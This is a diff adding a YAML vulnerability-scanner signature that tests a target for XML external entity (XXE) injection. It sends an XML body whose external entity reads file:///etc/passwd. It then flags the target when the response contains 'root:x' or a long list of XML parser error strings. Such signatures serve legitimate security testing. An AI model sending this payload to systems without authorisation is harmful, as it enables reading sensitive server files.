@@ -1,0 +1,22 @@
+# Signature catchs XXE errors and "root:x" 
+id: XXE-Injection
+info:
+  name: XXE Injection
+  risk: Critical
+
+params:
+  - root: '{{.URL}}'
+
+requests:
+  - method: POST
+    redirect: false
+    url: >-
+      {{.root}}
+    
+    body: >-
+      <?xml version="1.0"?>
+        <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
+        <root>&test;</root>
+    detections:
+      - >-
+        RegexSearch("resBody", "root:x") || RegexSearch("resBody", "simplexml_load_string|parser error :|An error occured!|xmlParseEntityDecl|simplexml_load_string|xmlParseInternalSubset|DOCTYPE improperly terminated|Start tag expected|No declaration for attribute|No declaration for element|failed to load external entity|Start tag expected|Invalid URI: file:|Malformed declaration expecting version|Unicode strings with encoding|must be well-formed|Content is not allowed in prolog|org.xml.sax|SAXParseException|com.sun.org.apache.xerces|ParseError|nokogiri|REXML|XML syntax error on line|Error unmarshaling XML|conflicts with field|illegal character code|XML Parsing Error|SyntaxError|no root element|not well-formed|could not be parsed from XML")
